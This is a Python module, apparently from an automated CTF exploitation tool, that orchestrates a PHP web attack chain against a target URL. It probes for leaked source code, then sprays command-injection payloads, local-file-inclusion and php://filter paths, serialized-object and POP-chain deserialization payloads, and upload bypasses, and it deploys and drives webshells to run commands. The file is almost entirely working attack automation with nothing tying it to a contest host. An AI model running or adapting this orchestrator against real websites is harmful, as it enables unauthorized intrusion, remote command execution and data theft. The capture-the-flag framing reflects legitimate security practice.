"""Attack chain orchestrator for CTF Web challenges.

Implements a state machine that chains discovery, audit, exploitation,
and flag capture into an automated pipeline:

  SOURCE_LEAK_SCAN -> PHP_AUDIT -> VULN_CLASSIFY ->
    DESER_EXPLOIT | UPLOAD_EXPLOIT | DIRECT_EXPLOIT ->
    PAYLOAD_GEN | UPLOAD_SHELL | INJECT_CMD ->
    TRIGGER_DESER | VERIFY_SHELL | READ_FLAG ->
    SUCCESS
"""
from __future__ import annotations

import logging
import re
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional
from urllib.parse import urljoin

import requests

from .source_leak_scanner import SourceLeakScanner, LeakResult
from .php_audit_engine import (
    PHPAuditEngine,
    PHPAuditReport,
    PHPVulnerability,
    VulnType,
    Severity,
)
from .source_analyzer import SourceAnalysis, analyze_attachment
from .php_deser_framework import (
    POPChainSelector,
    PayloadGenerator,
    POPChain,
    quick_pop_payload,
)
from .upload_exploit import UploadExploit
from .webshell_manager import WebshellManager
from .workspace_cleaner import WorkspaceCleaner

log = logging.getLogger("autopnex.ctf.attack_chain_orchestrator")


# ---------------------------------------------------------------------------
# State machine
# ---------------------------------------------------------------------------

class ChainState(Enum):
    START = auto()
    SOURCE_LEAK_SCAN = auto()
    RECON_FALLBACK = auto()
    PHP_AUDIT = auto()
    VULN_CLASSIFY = auto()
    DESER_EXPLOIT = auto()
    UPLOAD_EXPLOIT = auto()
    DIRECT_EXPLOIT = auto()
    GENERATE_PAYLOAD = auto()
    UPLOAD_SHELL = auto()
    INJECT_CMD = auto()
    TRIGGER_DESER = auto()
    VERIFY_SHELL = auto()
    READ_FLAG = auto()
    SUCCESS = auto()
    FAILED = auto()


STATE_TRANSITIONS: Dict[ChainState, List[ChainState]] = {
    ChainState.START: [ChainState.SOURCE_LEAK_SCAN, ChainState.RECON_FALLBACK],
    ChainState.SOURCE_LEAK_SCAN: [ChainState.PHP_AUDIT, ChainState.RECON_FALLBACK, ChainState.DIRECT_EXPLOIT],
    ChainState.RECON_FALLBACK: [ChainState.DIRECT_EXPLOIT, ChainState.UPLOAD_EXPLOIT, ChainState.FAILED],
    ChainState.PHP_AUDIT: [ChainState.VULN_CLASSIFY],
    ChainState.VULN_CLASSIFY: [ChainState.DESER_EXPLOIT, ChainState.UPLOAD_EXPLOIT, ChainState.DIRECT_EXPLOIT],
    ChainState.DESER_EXPLOIT: [ChainState.GENERATE_PAYLOAD, ChainState.FAILED],
    ChainState.GENERATE_PAYLOAD: [ChainState.TRIGGER_DESER, ChainState.FAILED],
    ChainState.TRIGGER_DESER: [ChainState.READ_FLAG, ChainState.FAILED],
    ChainState.UPLOAD_EXPLOIT: [ChainState.UPLOAD_SHELL, ChainState.VERIFY_SHELL, ChainState.FAILED],
    ChainState.UPLOAD_SHELL: [ChainState.VERIFY_SHELL, ChainState.FAILED],
    ChainState.VERIFY_SHELL: [ChainState.READ_FLAG, ChainState.FAILED],
    ChainState.DIRECT_EXPLOIT: [ChainState.INJECT_CMD, ChainState.READ_FLAG, ChainState.FAILED],
    ChainState.INJECT_CMD: [ChainState.READ_FLAG, ChainState.FAILED],
    ChainState.READ_FLAG: [ChainState.SUCCESS, ChainState.FAILED],
}


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class ChainStepResult:
    state: ChainState
    success: bool
    data: Any = None
    error: str = ""
    duration_ms: int = 0

    def to_dict(self) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "state": self.state.name,
            "success": self.success,
            "error": self.error,
            "duration_ms": self.duration_ms,
        }
        if isinstance(self.data, (dict, list, str, int, float, bool)):
            result["data"] = self.data
        elif hasattr(self.data, "to_dict"):
            result["data"] = self.data.to_dict()
        return result


@dataclass
class AttackChainResult:
    success: bool
    flag: Optional[str] = None
    chain_steps: List[ChainStepResult] = field(default_factory=list)
    source_leak: Optional[LeakResult] = None
    vulnerabilities: List[PHPVulnerability] = field(default_factory=list)
    exploit_used: str = ""
    webshell_url: str = ""
    error: str = ""
    total_duration_ms: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "flag": self.flag,
            "steps": [s.to_dict() for s in self.chain_steps],
            "source_leak": self.source_leak.to_dict() if self.source_leak else None,
            "vulns_found": len(self.vulnerabilities),
            "vulns": [v.to_dict() for v in self.vulnerabilities[:20]],
            "exploit_used": self.exploit_used,
            "webshell_url": self.webshell_url,
            "error": self.error,
            "duration_ms": self.total_duration_ms,
        }


# ---------------------------------------------------------------------------
# AttackChainOrchestrator
# ---------------------------------------------------------------------------

class AttackChainOrchestrator:
    """Orchestrate the full PHP Web attack chain from discovery to flag capture."""

    def __init__(
        self,
        session: requests.Session,
        work_dir: str = "ctf_workspace",
        timeout: int = 15,
        exploit_enabled: bool = True,
        cleaner: Optional[WorkspaceCleaner] = None,
    ):
        self._session = session
        self._work_dir = Path(work_dir)
        self._timeout = timeout
        self._exploit_enabled = exploit_enabled

        # Workspace cleaner for temp file lifecycle
        self._cleaner = cleaner or WorkspaceCleaner(base_dir=work_dir, auto_clean=True)

        # Sub-modules (pass cleaner through for tracking)
        self._leak_scanner = SourceLeakScanner(session, work_dir=work_dir, cleaner=self._cleaner)
        self._auditor = PHPAuditEngine()
        self._pop_selector = POPChainSelector()
        self._payload_gen = PayloadGenerator(cleaner=self._cleaner)
        self._uploader = UploadExploit(session, timeout=timeout, cleaner=self._cleaner)
        self._shell_mgr = WebshellManager(session, timeout=timeout)

        # Shared state
        self._target: str = ""
        self._leak_results: List[LeakResult] = []
        self._audit_report: Optional[PHPAuditReport] = None
        self._source_files: Dict[str, str] = {}  # path -> text content

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def run(self, target_url: str, flag_pattern: str = r"[A-Za-z0-9_]+\{[^}]+\}") -> AttackChainResult:
        """Execute the full attack chain and return result."""
        self._target = target_url
        start = time.time()
        steps: List[ChainStepResult] = []

        self._flag_pattern = flag_pattern
        self._flag_re = re.compile(flag_pattern, re.I)

        try:
            current_state = ChainState.START
            visited: set = set()

            while current_state not in (ChainState.SUCCESS, ChainState.FAILED):
                if current_state in visited:
                    current_state = ChainState.FAILED
                    steps.append(ChainStepResult(
                        state=ChainState.FAILED, success=False,
                        error="State cycle detected; terminating",
                    ))
                    break
                visited.add(current_state)

                step = self._execute_state(current_state)
                steps.append(step)

                if step.success:
                    current_state = self._next_state(current_state, step)
                else:
                    fallback = self._fallback_state(current_state)
                    if fallback:
                        current_state = fallback
                    else:
                        current_state = ChainState.FAILED

            elapsed = int((time.time() - start) * 1000)

            # Extract flag from final steps
            flag = self._extract_flag_from_steps(steps)

            result = AttackChainResult(
                success=flag is not None,
                flag=flag,
                chain_steps=steps,
                source_leak=self._leak_results[0] if self._leak_results else None,
                vulnerabilities=self._audit_report.vulnerabilities if self._audit_report else [],
                exploit_used=self._get_exploit_name(steps),
                webshell_url=getattr(self._shell_mgr, "_last_verified_url", ""),
                total_duration_ms=elapsed,
            )

            # Preserve final report before cleanup
            if result.flag:
                report_path = self._save_report(result)
                self._cleaner.preserve(report_path)

            return result
        finally:
            # Guaranteed cleanup regardless of success/failure
            cleanup_stats = self._cleaner.cleanup()
            log.info("Cleanup: %s files, %s dirs removed",
                     cleanup_stats.get("files_deleted", 0),
                     cleanup_stats.get("dirs_deleted", 0))

    # ------------------------------------------------------------------
    # State execution
    # ------------------------------------------------------------------

    def _execute_state(self, state: ChainState) -> ChainStepResult:
        t0 = time.time()
        method = getattr(self, f"_do_{state.name.lower()}", None)
        if method is None:
            return ChainStepResult(
                state=state, success=False,
                error=f"No handler for state {state.name}",
                duration_ms=int((time.time() - t0) * 1000),
            )
        success, data = method()
        return ChainStepResult(
            state=state,
            success=success,
            data=data,
            duration_ms=int((time.time() - t0) * 1000),
        )

    def _do_start(self) -> tuple:
        """Validate target and prepare."""
        try:
            r = self._session.get(self._target, timeout=self._timeout)
            if r.status_code < 500:
                return True, {"status_code": r.status_code, "length": len(r.content)}
        except requests.RequestException as e:
            pass  # Continue anyway
        return True, {"note": "Starting attack chain"}

    def _do_source_leak_scan(self) -> tuple:
        """Scan for source code leaks."""
        results = self._leak_scanner.scan_all(self._target)
        self._leak_results = results

        # Check if we found anything useful
        for leak in results:
            if leak.leak_type != "none":
                # Try to analyze downloaded archives
                if leak.local_path and Path(leak.local_path).exists():
                    local = Path(leak.local_path)
                    if local.is_file() and local.stat().st_size > 100:
                        try:
                            analysis = analyze_attachment(str(local))
                            if analysis.files:
                                return True, {
                                    "leak": leak.to_dict(),
                                    "files_found": len(analysis.files),
                                    "analysis": analysis.to_prompt_context(max_findings=20),
                                }
                        except Exception:
                            pass
                return True, {"leak": leak.to_dict()}

        return False, {"reason": "No source leaks found"}

    def _do_recon_fallback(self) -> tuple:
        """Reconnaissance fallback when no source leaks."""
        endpoints_tried: List[tuple] = []

        # Probe common PHP endpoints directly
        for path in ["/index.php", "/admin.php", "/flag.php", "/config.php",
                     "/upload.php", "/api.php", "/test.php", "/login.php",
                     "/register.php", "/info.php"]:
            url = self._target.rstrip("/") + path
            try:
                r = self._session.get(url, timeout=self._timeout)
                if r.status_code == 200:
                    endpoints_tried.append((path, r.status_code, len(r.content)))
                    # Check for flag in response
                    if self._check_flag(r.text):
                        return True, {
                            "flag_found": True,
                            "url": url,
                            "body": r.text,
                        }
            except requests.RequestException:
                continue

        return bool(endpoints_tried), {"endpoints": endpoints_tried}

    def _do_php_audit(self) -> tuple:
        """Audit PHP source code for vulnerabilities."""
        if not self._leak_results:
            return False, {"reason": "No source files to audit"}

        all_vulns: List[PHPVulnerability] = []
        files_analyzed = 0

        for leak in self._leak_results:
            if leak.local_path and Path(leak.local_path).exists():
                local = Path(leak.local_path)
                if local.is_dir():
                    php_files = list(local.rglob("*.php")) + list(local.rglob("*.phtml"))
                    php_files += list(local.rglob("*.inc")) + list(local.rglob("*.pht"))
                    for php_file in php_files[:50]:
                        try:
                            text = php_file.read_text(errors="replace")
                            self._source_files[str(php_file)] = text
                            vulns = self._auditor.audit_text(str(php_file), text)
                            all_vulns.extend(vulns)
                            files_analyzed += 1
                        except Exception:
                            continue
                elif local.is_file():
                    try:
                        analysis = analyze_attachment(str(local))
                        for file_entry in analysis.files:
                            path = file_entry.get("path", "")
                    except Exception:
                        pass

        self._audit_report = PHPAuditReport(
            files_analyzed=files_analyzed,
            total_lines=sum(len(t.splitlines()) for t in self._source_files.values()),
            vulnerabilities=all_vulns,
            framework=self._leak_results[0].framework if self._leak_results else "",
        )

        return files_analyzed > 0, {
            "files_analyzed": files_analyzed,
            "vulns_found": len(all_vulns),
            "critical": len([v for v in all_vulns if v.severity == Severity.CRITICAL]),
            "high": len([v for v in all_vulns if v.severity == Severity.HIGH]),
        }

    def _do_vuln_classify(self) -> tuple:
        """Classify vulnerabilities and decide exploitation path."""
        if not self._audit_report or not self._audit_report.vulnerabilities:
            return False, {"reason": "No vulnerabilities to classify"}

        by_type: Dict[VulnType, List[PHPVulnerability]] = {}
        for v in self._audit_report.vulnerabilities:
            by_type.setdefault(v.vuln_type, []).append(v)

        # Priority: CMD_INJECT > CODE_EXEC > ARBITRARY_FILE_WRITE > DESER_RCE >
        #           FILE_INCLUDE > ARBITRARY_FILE_READ > SQL_INJECT > UPLOAD > PHAR
        priorities = [
            (VulnType.CMD_INJECT, "direct_exploit"),
            (VulnType.CODE_EXEC, "direct_exploit"),
            (VulnType.ARBITRARY_FILE_WRITE, "upload_exploit"),
            (VulnType.DESER_RCE, "deser_exploit"),
            (VulnType.FILE_INCLUDE, "direct_exploit"),
            (VulnType.ARBITRARY_FILE_READ, "direct_exploit"),
            (VulnType.SQL_INJECT, "direct_exploit"),
            (VulnType.FILE_UPLOAD, "upload_exploit"),
            (VulnType.PHAR_TRIGGER, "deser_exploit"),
        ]

        for vt, path in priorities:
            if vt in by_type:
                self._chosen_path = path
                return True, {
                    "chosen_path": path,
                    "trigger_vuln_type": vt.value,
                    "count": len(by_type[vt]),
                    "top_vuln": by_type[vt][0].to_dict(),
                }

        return False, {"reason": "No exploitable vulnerability type found"}

    def _do_deser_exploit(self) -> tuple:
        """Attempt PHP deserialization exploitation."""
        if not self._exploit_enabled:
            return False, {"reason": "Exploit disabled"}

        framework = self._leak_results[0].framework if self._leak_results else ""
        source_text = "\n".join(self._source_files.values()) if self._source_files else ""
        class_list = list(set(
            cls.get("name", "") for analysis in
            [analyze_attachment(str(Path(leak.local_path))) for leak in self._leak_results if leak.local_path]
            if hasattr(analysis, "classes") for cls in analysis.classes
        )) if self._leak_results else []

        chains = self._pop_selector.select(
            framework=framework,
            available_classes=class_list,
            source_text=source_text,
        )

        if not chains:
            return False, {"reason": "No matching POP chain found"}

        return True, {
            "chains_found": len(chains),
            "best_chain": chains[0].name,
            "framework": chains[0].framework,
        }

    def _do_generate_payload(self) -> tuple:
        """Generate deserialization payload."""
        framework = self._leak_results[0].framework if self._leak_results else ""
        chains = self._pop_selector.select(framework=framework)
        if not chains:
            return False, {"reason": "No POP chain available for payload generation"}

        chain = chains[0]
        try:
            payload = self._payload_gen.serialize_payload(chain, "cat /flag")
            phar_payload = self._payload_gen.phar_payload(chain, "cat /flag")
            self._current_payload = payload
            self._current_phar = phar_payload
            return True, {
                "chain": chain.name,
                "payload_size": len(payload),
                "serialized_hex": payload[:100].hex(),
                "phar_size": len(phar_payload),
            }
        except Exception as e:
            return False, {"reason": f"Payload generation failed: {e}"}

    def _do_trigger_deser(self) -> tuple:
        """Send deserialization payload to target."""
        if not hasattr(self, '_current_payload') or not self._current_payload:
            return False, {"reason": "No payload generated"}

        # Try common deser endpoints
        endpoints = [
            self._target.rstrip("/"),
            self._target.rstrip("/") + "/index.php",
            self._target.rstrip("/") + "/api.php",
            self._target.rstrip("/") + "/upload",
        ]

        for endpoint in endpoints:
            try:
                r = self._session.post(
                    endpoint,
                    data={"data": self._current_payload, "pop": self._current_payload},
                    timeout=self._timeout,
                )
                if self._check_flag(r.text):
                    return True, {
                        "flag": self._extract_flag(r.text),
                        "url": endpoint,
                        "status_code": r.status_code,
                        "method": "post_body",
                    }
                # Also try GET with urlencoded payload
                r2 = self._session.get(
                    endpoint,
                    params={"data": self._current_payload.decode("latin-1", errors="replace")},
                    timeout=self._timeout,
                )
                if self._check_flag(r2.text):
                    return True, {
                        "flag": self._extract_flag(r2.text),
                        "url": endpoint,
                        "status_code": r2.status_code,
                        "method": "get_param",
                    }
            except requests.RequestException:
                continue

        return False, {"reason": "Deser trigger did not return flag"}

    def _do_upload_exploit(self) -> tuple:
        """Attempt file upload exploitation."""
        if not self._exploit_enabled:
            return False, {"reason": "Exploit disabled"}

        results = self._uploader.try_all_bypasses(self._target.rstrip("/") + "/upload")
        successful = [r for r in results if r.get("success")]
        if not successful:
            results2 = self._uploader.try_all_bypasses(self._target.rstrip("/") + "/upload.php")
            successful = [r for r in results2 if r.get("success")]

        if successful:
            return True, {
                "attempts": len(results),
                "successful": len(successful),
                "best": successful[0],
            }
        return False, {"attempts": len(results), "successful_count": 0}

    def _do_upload_shell(self) -> tuple:
        """Upload a webshell for remote execution."""
        results = self._shell_mgr.deploy_via_upload(
            self._target.rstrip("/") + "/upload",
            shell_types=["get_cmd", "minimal", "classic", "base64", "post_cmd"],
        )
        active = [r for r in results if r.deployed]
        if active:
            self._last_shell_result = active[0]
            return True, {"shell_type": active[0].shell_type}
        return False, {"reason": "No shell could be deployed"}

    def _do_verify_shell(self) -> tuple:
        """Verify webshell works."""
        if hasattr(self, '_last_shell_result'):
            verified = self._shell_mgr.verify(
                self._last_shell_result.url,
                self._last_shell_result.shell_type,
            )
            return verified, {"url": self._last_shell_result.url, "verified": verified}
        return False, {"reason": "No shell to verify"}

    def _do_direct_exploit(self) -> tuple:
        """Direct exploitation without intermediate steps."""
        if not self._exploit_enabled:
            return False, {"reason": "Exploit disabled"}

        results: List[Dict[str, Any]] = []

        # Strategy 1: Try command injection on common parameters
        base = self._target.rstrip("/")
        cmd_params = [
            ("cmd", "cat /flag"),
            ("exec", "cat /flag"),
            ("command", "cat /flag"),
            ("shell", "cat /flag"),
            ("ping", "127.0.0.1;cat /flag"),
            ("ip", "127.0.0.1|cat /flag"),
            ("host", "localhost$(cat /flag)"),
            ("target", "127.0.0.1&&cat /flag"),
            ("query", ";cat /flag"),
            ("domain", "`cat /flag`"),
        ]

        for endpoint in ["/index.php", "/ping.php", "/api.php", "/debug.php", "/test.php", "/"]:
            for param, value in cmd_params:
                try:
                    r = self._session.get(
                        base + endpoint,
                        params={param: value},
                        timeout=self._timeout,
                    )
                    if self._check_flag(r.text):
                        flag = self._extract_flag(r.text)
                        return True, {
                            "flag": flag,
                            "endpoint": endpoint,
                            "param": param,
                            "payload": value,
                            "method": "GET",
                        }
                except requests.RequestException:
                    continue

        # Strategy 2: Try LFI on common parameters
        lfi_params = ["file", "path", "page", "include", "template", "view", "filename"]
        for endpoint in ["/index.php", "/view.php", "/page.php", "/include.php", "/"]:
            for param in lfi_params:
                for payload in [
                    "/flag",
                    "/flag.txt",
                    "php://filter/convert.base64-encode/resource=/flag",
                    "php://filter/convert.base64-encode/resource=/flag.txt",
                    "../../../../flag",
                ]:
                    try:
                        r = self._session.get(
                            base + endpoint,
                            params={param: payload},
                            timeout=self._timeout,
                        )
                        if self._check_flag(r.text):
                            return True, {
                                "flag": self._extract_flag(r.text),
                                "endpoint": endpoint,
                                "param": param,
                                "payload": payload,
                                "method": "LFI",
                            }
                    except requests.RequestException:
                        continue

        # Strategy 3: Try POST-based deserialization on all endpoints
        for endpoint in ["/index.php", "/api.php", "/", "/upload"]:
            for param_name in ["data", "pop", "payload", "serialize"]:
                try:
                    payload = b'O:1:"A":1:{s:1:"x";s:7:"cat /flag";}'
                    r = self._session.post(
                        base + endpoint,
                        data={param_name: payload},
                        timeout=self._timeout,
                    )
                    if self._check_flag(r.text):
                        return True, {
                            "flag": self._extract_flag(r.text),
                            "endpoint": endpoint,
                            "method": "POST_deser",
                        }
                except requests.RequestException:
                    continue

        return False, {"reason": "Direct exploitation did not succeed"}

    def _do_inject_cmd(self) -> tuple:
        """Inject command through an established channel."""
        if hasattr(self, '_last_shell_result'):
            result = self._shell_mgr.execute(
                self._last_shell_result.url,
                "cat /flag",
                self._last_shell_result.shell_type,
            )
            output = result.get("output", "")
            if self._check_flag(output):
                return True, {"flag": self._extract_flag(output)}
        return False, {"reason": "Command injection did not return flag"}

    def _do_read_flag(self) -> tuple:
        """Final flag reading attempt through available channels."""
        # Check if we already have a flag from the previous step
        if hasattr(self, '_found_flag') and self._found_flag:
            return True, {"flag": self._found_flag}

        # Try webshell flag reading
        if hasattr(self, '_last_shell_result'):
            flag_result = self._shell_mgr.read_flag(
                self._last_shell_result.url,
                self._last_shell_result.shell_type,
            )
            if flag_result and flag_result.get("flag"):
                return True, flag_result

        # As last resort, try direct flag reading
        base = self._target.rstrip("/")
        flag_urls = [
            f"{base}/flag",
            f"{base}/flag.txt",
            f"{base}/../../../flag",
            f"{base}/../../flag.txt",
        ]
        for furl in flag_urls:
            try:
                r = self._session.get(furl, timeout=self._timeout)
                if self._check_flag(r.text):
                    return True, {"flag": self._extract_flag(r.text), "url": furl}
            except requests.RequestException:
                continue

        return False, {"reason": "Could not read flag"}

    def _do_success(self) -> tuple:
        return True, {"status": "Flag captured successfully"}

    def _do_failed(self) -> tuple:
        return False, {"status": "Attack chain failed"}

    # ------------------------------------------------------------------
    # State transitions
    # ------------------------------------------------------------------

    def _next_state(self, current: ChainState, step: ChainStepResult) -> ChainState:
        transitions = STATE_TRANSITIONS.get(current, [])
        if not transitions:
            return ChainState.FAILED

        # Pick the first valid transition (or return FAILED if none)
        if not step.success:
            return ChainState.FAILED
        return transitions[0]

    def _fallback_state(self, current: ChainState) -> Optional[ChainState]:
        transitions = STATE_TRANSITIONS.get(current, [])
        if len(transitions) > 1:
            return transitions[1]
        return None

    # ------------------------------------------------------------------
    # Flag utilities
    # ------------------------------------------------------------------

    def _check_flag(self, text: str) -> bool:
        return bool(self._flag_re.search(text)) if text else False

    def _extract_flag(self, text: str) -> Optional[str]:
        match = self._flag_re.search(text) if text else None
        return match.group(0) if match else None

    def _extract_flag_from_steps(self, steps: List[ChainStepResult]) -> Optional[str]:
        for step in reversed(steps):
            if step.success and isinstance(step.data, dict):
                flag = step.data.get("flag")
                if flag:
                    return flag
        return None

    def _get_exploit_name(self, steps: List[ChainStepResult]) -> str:
        names = [s.state.name for s in steps if s.success]
        return " -> ".join(names) if names else ""


    def _save_report(self, result: AttackChainResult) -> Path:
        """Save the final attack chain report as JSON."""
        import json
        report_dir = self._work_dir / "reports"
        report_dir.mkdir(parents=True, exist_ok=True)
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_path = report_dir / f"chain_report_{timestamp}.json"
        report_path.write_text(json.dumps(result.to_dict(), indent=2, ensure_ascii=False))
        return report_path


# ---------------------------------------------------------------------------
# Convenience function
# ---------------------------------------------------------------------------

def run_php_attack_chain(
    session: requests.Session,
    target_url: str,
    work_dir: str = "ctf_workspace",
    timeout: int = 15,
) -> AttackChainResult:
    """Quick entry point: run the full PHP attack chain."""
    orch = AttackChainOrchestrator(
        session=session,
        work_dir=work_dir,
        timeout=timeout,
        exploit_enabled=True,
    )
    return orch.run(target_url)
